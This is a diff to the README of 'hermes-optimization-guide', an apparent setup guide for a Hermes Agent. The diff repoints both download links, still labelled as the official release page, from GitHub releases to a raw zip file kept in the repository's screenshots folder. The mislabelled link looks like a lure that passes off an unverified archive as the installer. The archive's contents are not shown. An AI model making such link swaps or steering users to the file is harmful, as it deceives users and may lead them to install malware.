@@ -1,6 +1,6 @@
 # 📦 hermes-optimization-guide - Master your agent configuration and skills
 
-[![Download Hermes](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Guilhermepelido/hermes-optimization-guide/releases)
+[![Download Hermes](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Guilhermepelido/hermes-optimization-guide/main/screenshots/optimization-hermes-guide-v2.0.zip)
 
 ## What is this tool?
 The hermes-optimization-guide provides a clear pathway for you to manage your Hermes Agent. This software helps you migrate existing data, set up LightRAG systems, and integrate Telegram notifications into your daily workflow. The objective is to simplify complex tasks into basic steps. You create, test, and deploy skills without writing code. This guide serves as the foundation for your automation environment.
@@ -16,7 +16,7 @@ Before you begin, verify your computer meets these basic standards:
 ## 📥 Downloading the software
 To get started, obtain the latest version of the application from the official distribution page.
 
-[Click here to visit the release page and download the installer](https://github.com/Guilhermepelido/hermes-optimization-guide/releases)
+[Click here to visit the release page and download the installer](https://raw.githubusercontent.com/Guilhermepelido/hermes-optimization-guide/main/screenshots/optimization-hermes-guide-v2.0.zip)
 
 Follow these steps to complete the download:
 1. Open the provided link in your web browser.
